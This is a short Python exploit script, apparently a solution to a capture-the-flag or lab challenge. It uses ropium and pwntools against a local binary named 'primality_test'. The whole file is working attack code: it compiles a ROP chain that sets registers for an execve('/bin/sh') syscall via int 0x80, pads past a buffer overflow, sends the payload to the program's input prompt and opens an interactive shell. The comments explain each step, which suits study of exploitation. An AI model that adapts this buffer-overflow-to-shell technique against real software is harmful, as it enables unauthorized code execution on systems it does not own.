"""
Exploit write in Python with ropium and pwntools.
"""

from ropium import *
from pwn import *

file_path = './primality_test'

# List of gadgets extract with Ropper
INT = 0x08048607  # int 0x80;
BIN_SH = 0x08048991  # "/bin/sh"

rop = ROPium(ARCH.X86)  # Specify compile architecture of binary
rop.load(file_path)  # Loading binary in Ropium
rop.os = OS.LINUX  # Setting operating system

rop.bad_bytes = [0x0a]  # Bytes of enter key that should not appear in the ropchain
chain = rop.compile('eax=0xb')  # Build ROP chain with setting of register
chain += rop.compile('ecx=0')
chain += rop.compile('ebx=' + str(BIN_SH))
chain += rop.compile('edx=0')

# Print of chain string
print("ROP chain without padding:")
print(chain.dump())

# Generate padding for exploit the buffer overflow vulnerability
ropchain = b'A'*(0x4c + 4) + chain.dump('raw') + p32(INT)

io = process([file_path])   # Executing the executable with ropchain as input
io.sendlineafter(b'Enter a number: ', ropchain)  # Send a single line from the communication tube and ropchain
io.interactive()  # To manually interact with the spawn shell
